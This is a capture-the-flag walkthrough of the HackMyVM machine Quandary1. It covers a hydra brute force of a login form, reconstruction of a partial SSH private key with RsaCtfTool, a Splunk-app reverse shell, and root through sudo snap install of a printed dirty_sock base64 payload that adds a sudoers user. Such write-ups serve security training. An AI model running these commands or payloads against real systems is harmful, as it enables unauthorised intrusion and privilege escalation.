---
layout: post
title: "HackMyVM - Quandary1"
date: 2023-03-29 00:00:00 +0100
categories: hmv
tag: ["RSA", "Splunk"]
---

Creator: [Proxy](https://hackmyvm.eu/profile/?user=Proxy)
Level: Hard
Release Date: 2023-03-15

## Scan

```sh
$ nmap -sC -sV -oA scans/Quandary1 -p- 192.168.1.21
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-29 19:45 WEST
Nmap scan report for 192.168.1.21
Host is up (0.00064s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 81560bdc551faa606864239a9ff79cc7 (RSA)
|   256 43f311c7e4bec9bf4f6c1b48f6e41368 (ECDSA)
|_  256 3cb98d3f70b2311596f8ce952986b785 (ED25519)
80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Under Construction
8000/tcp open  http     Splunkd httpd
|_http-server-header: Splunkd
| http-robots.txt: 1 disallowed entry 
|_/
| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was http://192.168.1.21:8000/en-US/account/login?return_to=%2Fen-US%2F
8089/tcp open  ssl/http Splunkd httpd
|_http-server-header: Splunkd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2023-02-24T10:44:38
|_Not valid after:  2026-02-23T10:44:38
|_http-title: splunkd
| http-robots.txt: 1 disallowed entry 
|_/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.10 seconds
```

## Enumeration 

### 80

```bash
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://quandary.hmv -x php,html,txt,jpg -o scans/gobuster-80-medium.log 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://quandary.hmv
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              php,html,txt,jpg
[+] Timeout:                 10s
===============================================================
2023/03/29 19:51:53 Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 685]
/.php                 (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
Progress: 1099915 / 1102805 (99.74%)
===============================================================
2023/03/29 19:54:27 Finished
===============================================================

```

### Server Port 80

```bash
$ nikto -h http://192.168.1.21/ -C all -output scans/nikto-192.168.1.21.html -Format HTML
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.1.21
+ Target Hostname:    192.168.1.21
+ Target Port:        80
+ Start Time:         2023-03-29 20:05:05 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /: Server may leak inodes via ETags, header found with file /, inode: 2ad, size: 5f59b1116ff56, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ Apache/2.4.41 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ OPTIONS: Allowed HTTP Methods: HEAD, GET, POST, OPTIONS .
+ 26640 requests: 0 error(s) and 5 item(s) reported on remote host
+ End Time:           2023-03-29 20:06:09 (GMT1) (64 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

### 8000

```bash
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://quandary.hmv:8000 -x php,html,txt,jpg -o scans/gobuster-8000-medium.log -b 303,404
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://quandary.hmv:8000
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404,303
[+] User Agent:              gobuster/3.5
[+] Extensions:              txt,jpg,php,html
[+] Timeout:                 10s
===============================================================
2023/03/29 19:56:12 Starting gobuster in directory enumeration mode
===============================================================
/robots.txt           (Status: 200) [Size: 26]
Progress: 1102189 / 1102805 (99.94%)
===============================================================
2023/03/29 19:59:21 Finished
===============================================================


```

### Subdomain

```bash
$ wfuzz -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u "http://quandary.hmv" -H "Host: FUZZ.quandary.hmv" --hh=685 

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://quandary.hmv/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                              
=====================================================================

000009532:   400        10 L     35 W       295 Ch      "#www"                                                                                               
000010581:   400        10 L     35 W       295 Ch      "#mail"                                                                                              
000047706:   400        10 L     35 W       295 Ch      "#smtp"                                                                                              
000103135:   400        10 L     35 W       295 Ch      "#pop3"                                                                                              
000106244:   200        118 L    229 W      2230 Ch     "directadmin"                                                                                        

Total time: 132.9039
Processed Requests: 114441
Filtered Requests: 114436
Requests/sec.: 861.0805
```

* http://directadmin.quandary.hmv

<img src="https://drive.google.com/uc?id=1wNPA2cmhU0CY87KyJaOg3qjhF0Bl7McG"/>

## Cracking Login Form HTTP

* REQUEST

```http
POST /login.php HTTP/1.1
Host: directadmin.quandary.hmv
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 21
Origin: http://directadmin.quandary.hmv
Connection: close
Referer: http://directadmin.quandary.hmv/
Cookie: PHPSESSID=mn5mmqhv5vmlo9b4n01p7na3br
Upgrade-Insecure-Requests: 1

uname=ADMIN&psw=ADMIN
```

* RESPONSE

```http
HTTP/1.1 200 OK
Date: Wed, 29 Mar 2023 20:15:32 GMT
Server: Apache/2.4.41 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 56
Connection: close
Content-Type: text/html; charset=UTF-8

<div class="error">Incorrect username or password.</div>

```

* Cracking admin login

```bash
$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 'http-post-form://directadmin.quandary.hmv/login.php:uname=^USER^&psw=^PASS^:Incorrect'

Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-29 21:17:09
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://directadmin.quandary.hmv:80/login.php:uname=^USER^&psw=^PASS^:Incorrect
[80][http-post-form] host: directadmin.quandary.hmv   login: admin   password: q****w
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-03-29 21:18:02
```

<img src="https://drive.google.com/uc?id=1L6DaqE75dvWUGtZCNZny9o-iNilRlQQS"/>

## Cracking RSA - [RSACTFTOOL](https://github.com/RsaCtfTool/RsaCtfTool)

### From Website

```private
zfWP0Oewz87090bqRvmdyw5HvVzOnmhQAAAMEA3bbbBmTDBn4E/86brUv/b3nBhMiR1bbx
nIEKyhulHY5mf3KcneltIzfJDRdg/pmjCcGTkAkHc0BN9bLy6d2gQLOlsw9PY/tbXuVp69
LIxDbA4UfeS+/CTrpREVj+rBU1R6DJvJ5pnWSIx+pWEc6M9Ysfi4PQtJgGINxd5BEwyX/g
yHu5gjadvjsUYTpSGq+pEE44tHhAcrrx81F/J2iKYyyJ9iAxvlqPHWL6mhum1W4OofiWDJ
C+O4pw4gKwfuX5AAAAEWxhd3JlbmNlQHF1YW5kYXJ5AQ==
-----END OPENSSH PRIVATE KEY-----
```

```public
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMkW1dygI8UCOwrEjjCnceOqjY2DOnw6kUtCs4KAId5f/xeKjx6hsC9Okvm0u/Rs/TiLhqQm+ibpo/EVZ4vvw8XcrEqTdrU60OPiZO+RRUVHdps+SlLAys/h+jopRfEvfeE4G86Kzm0pNwPoiny9ruLDa3ByPjhe3x9Rx9Vb+2KxZtXkEWeC1G8xILp5jG5gwboe6ncRtvTvko31iZCXG4eEAf04tdCitmF11KDoLgnmWsAmGIZoUDGaoydNUEMi2cGiaUiOzvAIvAbUXoZLRcuOVyPv8eHL+hpmk/xPa4hN6z510EBbfiBEgTj12pu1SMQ1E5DsS/d7n+UxEeM0M1ooVic85ttXAY4VzThX/2c6b7o9iPtZ2QtyvFnV2Fb8RgclN3rrk7sLrw6t4YzxyyLLKGviLDEXssPJ7QSQmbA5kEFTTj8ATg2l+VqKbqljvbslTj/KzJiiycUg5RfHMmi7/gAEI9DMIcOCNgYy2CKDv/1K94VYFOBKOT5nAsMF0= lawrence@quandary
```

### Decode RSA

```bash
$ base64 -d id_rsa | xxd
base64: invalid input
00000000: cdf5 8fd0 e7b0 cfce f4f7 46ea 46f9 9dcb  ..........F.F...
00000010: 0e47 bd5c ce9e 6850 0000 0c10 0ddb 6db0  .G.\..hP......m.
00000020: 664c 3067 e04f fce9 bad4 bff6 f79c 184c  fL0g.O.........L
00000030: 891d 5b6f 19c8 10ac a1ba 51d8 e667 f729  ..[o......Q..g.)
00000040: c9de 96d2 337c 90d1 760f e99a 309c 1939  ....3|..v...0..9
00000050: 0090 7734 04df 5b2f 2e9d da04 0b3a 5b30  ..w4..[/.....:[0
00000060: f4f6 3fb5 b5ee 569e bd2c 8c43 6c0e 147d  ..?...V..,.Cl..}
00000070: e4be fc24 eba5 1115 8fea c153 547a 0c9b  ...$.......STz..
00000080: c9e6 99d6 488c 7ea5 611c e8cf 58b1 f8b8  ....H.~.a...X...
00000090: 3d0b 4980 620d c5de 4113 0c97 fe0c 87bb  =.I.b...A.......
000000a0: 9823 69db e3b1 4613 a521 aafa 9104 e38b  .#i...F..!......
000000b0: 4784 072b af1f 3517 f276 88a6 32c8 9f62  G..+..5..v..2..b
000000c0: 031b e5a8 f1d6 2fa9 a1ba 6d56 e0ea 1f89  ....../...mV....
000000d0: 60c9 0be3 b8a7 0e20 2b07 ee5f 9000 0001  `...... +.._....
000000e0: 16c6 1777 2656 e636 5407 1756 16e6 4617  ...w&V.6T..V..F.
000000f0: 2790 10                                  '..
```

* Find JUNK offset

```python
$ python3                
Python 3.11.2 (main, Feb 12 2023, 00:48:52) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> 0x0c10
3088
>>> 
```

* ADD "AA" Junk until end of RSA file

```private
AAzfWP0Oewz87090bqRvmdyw5HvVzOnmhQAAAMEA3bbbBmTDBn4E/86brUv/b3nBhMiR1bbx
nIEKyhulHY5mf3KcneltIzfJDRdg/pmjCcGTkAkHc0BN9bLy6d2gQLOlsw9PY/tbXuVp69
LIxDbA4UfeS+/CTrpREVj+rBU1R6DJvJ5pnWSIx+pWEc6M9Ysfi4PQtJgGINxd5BEwyX/g
yHu5gjadvjsUYTpSGq+pEE44tHhAcrrx81F/J2iKYyyJ9iAxvlqPHWL6mhum1W4OofiWDJ
C+O4pw4gKwfuX5AAAAEWxhd3JlbmNlQHF1YW5kYXJ5AQ==
-----END OPENSSH PRIVATE KEY-----
```

```bash
$ base64 -d id_rsa2 | xxd
base64: invalid input
00000000: 000c df58 fd0e 7b0c fcef 4f74 6ea4 6f99  ...X..{...Otn.o.
00000010: dcb0 e47b d5cc e9e6 8500 0000 c100 ddb6  ...{............
00000020: db06 64c3 067e 04ff ce9b ad4b ff6f 79c1  ..d..~.....K.oy.
00000030: 84c8 91d5 b6f1 9c81 0aca 1ba5 1d8e 667f  ..............f.
00000040: 729c 9de9 6d23 37c9 0d17 60fe 99a3 09c1  r...m#7...`.....
00000050: 9390 0907 7340 4df5 b2f2 e9dd a040 b3a5  ....s@M......@..
00000060: b30f 4f63 fb5b 5ee5 69eb d2c8 c436 c0e1  ..Oc.[^.i....6..
00000070: 47de 4bef c24e ba51 1158 feac 1535 47a0  G.K..N.Q.X...5G.
00000080: c9bc 9e69 9d64 88c7 ea56 11ce 8cf5 8b1f  ...i.d...V......
00000090: 8b83 d0b4 9806 20dc 5de4 1130 c97f e0c8  ...... .]..0....
000000a0: 7bb9 8236 9dbe 3b14 613a 521a afa9 104e  {..6..;.a:R....N
000000b0: 38b4 7840 72ba f1f3 517f 2768 8a63 2c89  8.x@r...Q.'h.c,.
000000c0: f620 31be 5a8f 1d62 fa9a 1ba6 d56e 0ea1  . 1.Z..b.....n..
000000d0: f896 0c90 be3b 8a70 e202 b07e e5f9 0000  .....;.p...~....
000000e0: 0011 6c61 7772 656e 6365 4071 7561 6e64  ..lawrence@quand
000000f0: 6172 7901                                ary.
```

* Find offset

```python
$ python3 
Python 3.11.2 (main, Feb 12 2023, 00:48:52) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> 0xc1
193
>>>
```

* Trim from offset to end of RSA file

```bash
$ base64 -d id_rsa | xxd -seek 29 -l 193 -p
base64: invalid input
00ddb6db0664c3067e04ffce9bad4bff6f79c184c891d5b6f19c810aca1b
a51d8e667f729c9de96d2337c90d1760fe99a309c19390090773404df5b2
f2e9dda040b3a5b30f4f63fb5b5ee569ebd2c8c436c0e147de4befc24eba
511158feac153547a0c9bc9e699d6488c7ea5611ce8cf58b1f8b83d0b498
0620dc5de41130c97fe0c87bb982369dbe3b14613a521aafa9104e38b478
4072baf1f3517f27688a632c89f62031be5a8f1d62fa9a1ba6d56e0ea1f8
960c90be3b8a70e202b07ee5f9
```

* Parse result and cleanup

```bash
$ base64 -d id_rsa | xxd -seek 29 -l 193 -p > ssh_magic

$ cat ssh_magic | tr -d '\n' | sponge ssh_magic
```

### Values - RSACTFTOOL 

```python
$ python3 RsaCtfTool.py --dumpkey --key id_rsa.pub --private
n: 4642421543991179019964692016788403177025358063102268524212423228189528596895170405153602445615118419212223226078074453986177472725050022572587024783411210723545417223580795714337658317644600710977643659117646138971288507670714891915567627657016012444148959410342945730970014623180839037352324793504854280898767977521184232703784662443937471871622433994077336438059851303086048286261868207715006857520994317314821143055143592860860368254426653723888757730451605284748162042770667676361851991339230785775821819532309277372272457963213800075499186577460643456066054587133719735722722251521202461419907661026967268418772174427525979398819794375601193383454474268781976098528566869480441959440610281074050975272532072205542487391556023279787075858556906874328679193257003390683054283767394238642958016947628361850991027906221743379943686704898841560306199533457085371947617432419977464891192335343525374168230063727387700039004253
e: 65537
```

```python
$ python3 RsaCtfTool.py -q 0x$(cat ssh_magic) -e 65537 -n 4642421543991179019964692016788403177025358063102268524212423228189528596895170405153602445615118419212223226078074453986177472725050022572587024783411210723545417223580795714337658317644600710977643659117646138971288507670714891915567627657016012444148959410342945730970014623180839037352324793504854280898767977521184232703784662443937471871622433994077336438059851303086048286261868207715006857520994317314821143055143592860860368254426653723888757730451605284748162042770667676361851991339230785775821819532309277372272457963213800075499186577460643456066054587133719735722722251521202461419907661026967268418772174427525979398819794375601193383454474268781976098528566869480441959440610281074050975272532072205542487391556023279787075858556906874328679193257003390683054283767394238642958016947628361850991027906221743379943686704898841560306199533457085371947617432419977464891192335343525374168230063727387700039004253 --private

Results for /tmp/tmpovzs1o6_:

Private key :
-----BEGIN RSA PRIVATE KEY-----
MIIG5QIBAAKCAYEAzJFtXcoCPFAjsKxI4wp3Hjqo2Ngzp8OpFLQrOCgCHeX/8Xio
8eobAvTpL5tLv0bP04i4akJvom6aPxFWeL78PF3KxKk3a1OtDj4mTvkUVFR3abPk
[REDACTE]
arVeYZ5aJvSXwizf1PzGDk0ehURr6WLmoLDe63LgN6A2mvoKbfUHs+E3MYCL97A6
KxsmGbE5tB6V8aQV7HdK+AZinpXjbifpf4WsUEX9PmM8MgtFtmX8IpA3XZxu5zjZ
FJTGQoZY4q9rpO47HHtXOsKmPDViDhdktvG/qoSBCKZUevHEsJlcWug=
-----END RSA PRIVATE KEY-----
```

## SSH

```bash
$ chmod 600 id_rsa-full

$ ssh -i id_rsa-full lawrence@192.168.1.21                     
Last login: Sun Feb 26 12:17:04 2023 from 10.0.0.70
-bash-5.0$ 
```

* /home/admin/splunk-backup/cred

```
61646d696e3a7735564a39692333216f73
```

* CyberChef HEX decrypt

<img src="https://drive.google.com/uc?id=1tocopbAkxZbqstGHkj6fKISv1ZYOiCTT"/>

## Splunk Admin Page

<img src="https://drive.google.com/uc?id=1OmGNaWiQUJJO1fEykbJPCZKQ9Yicvk6g"/>

### [Payload with Splunk Shells](https://github.com/TBGSecurity/splunk_shells)

<img src="https://drive.google.com/uc?id=11_nJ_nm7thzQGI1Vxul0UZyYdncbd0V6"/>

<img src="https://drive.google.com/uc?id=1_Sfmv97C4syIt1kQEqpfv9AGXLYQIjlG"/>

<img src="https://drive.google.com/uc?id=1xYOYg_RLXVDMxi6HJ8-Mfn5qUX-6DOZn"/>

* Restart / Relog

<img src="https://drive.google.com/uc?id=1qOlAfjycsNGbvNs25-XGd026h_6rrP4g"/>

<img src="https://drive.google.com/uc?id=1rKSk5QQEXNv1tRGs1K5ffuE2rmnZYuRY"/>

### Reverse shell

<img src="https://drive.google.com/uc?id=1FA1GPUWldh6oSYwQIuQ-KzHzR1JyckHz"/>

<img src="https://drive.google.com/uc?id=1oE4zjMr3l7ffM_e8ayDSH_LgHCe9kw7G"/>

```bash
$ nc -lnvp 4444  
listening on [any] 4444 ...
connect to [192.168.1.6] from (UNKNOWN) [192.168.1.21] 35732
id
uid=1001(admin) gid=1001(admin) groups=1001(admin)

echo "ssh-rsa 
....
AAAAB3NzaC1yc2EAAAADAQABAAACAQCaEiPBtYq9rI1tqnBBW8awhBZ6/td5EcIBykTYk7J9cOL3s33+eTxzG+DOxrRIQkfaV2PT9W4D2sG/YbPim1gw
s0AlaO+X5qHp9v4w== adok@valakas" > /home/admin/.ssh/authorized_keys
```

## Root

```bash
admin@quandary:~$ sudo -l
Matching Defaults entries for admin on quandary:                                                                                                                       
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin                                                  

User admin may run the following commands on quandary:
    (ALL : ALL) NOPASSWD: /usr/bin/snap install *
admin@quandary:~$ 
```

### [Snap Application Payload](https://notes.vulndev.io/wiki/redteam/privilege-escalation/misc-1)

<img src="https://drive.google.com/uc?id=13Ngant8Dni-R5GOEvbWFJwmkVvMfseRt"/>

```bash
python3 -c 'print("aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw" + "A" * 4256 + "==")' | base64 -d > payload.snap
```

```bash
admin@quandary:/tmp$ python3 -c 'print("aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw" + "A" * 4256 + "==")' | base64 -d > payload.snap

admin@quandary:/tmp$ ls -la
total 496
drwxrwxrwt 18 root     root       4096 Mar 29 17:31 .
drwxr-xr-x 20 root     root       4096 Feb 26 22:27 ..
....
-rw-rw-r--  1 admin    admin      4096 Mar 29 17:31 payload.snap
....
admin@quandary:/tmp$ 
```

### dirty-sock

```bash
admin@quandary:/tmp$ sudo snap install /tmp/payload.snap --dangerous --devmode
dirty-sock 0.1 installed

admin@quandary:/tmp$ su dirty_sock
Password: dirty_sock

bash-5.0$ id
uid=1002(dirty_sock) gid=1002(dirty_sock) groups=1002(dirty_sock),27(sudo)

bash-5.0$ sudo -l
[sudo] password for dirty_sock: dirty_sock
Matching Defaults entries for dirty_sock on quandary:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dirty_sock may run the following commands on quandary:
    (ALL : ALL) ALL
    
bash-5.0$ sudo bash

root@quandary:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```
